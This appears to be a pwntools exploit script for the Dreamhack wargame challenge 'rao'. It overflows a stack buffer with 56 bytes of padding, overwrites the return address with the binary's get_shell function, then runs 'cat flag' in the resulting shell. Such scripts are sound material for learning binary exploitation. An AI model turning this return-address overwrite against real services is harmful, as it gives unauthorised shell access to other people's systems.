#!/usr/bin/env python3

from pwn import *

# ENV
PORT =  18875
HOST = "host3.dreamhack.games"
exe = context.binary = ELF('./rao', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

offset = 56

p.sendline(b"A"*offset + p64(exe.sym.get_shell))
p.sendline(b"cat flag")

p.interactive()
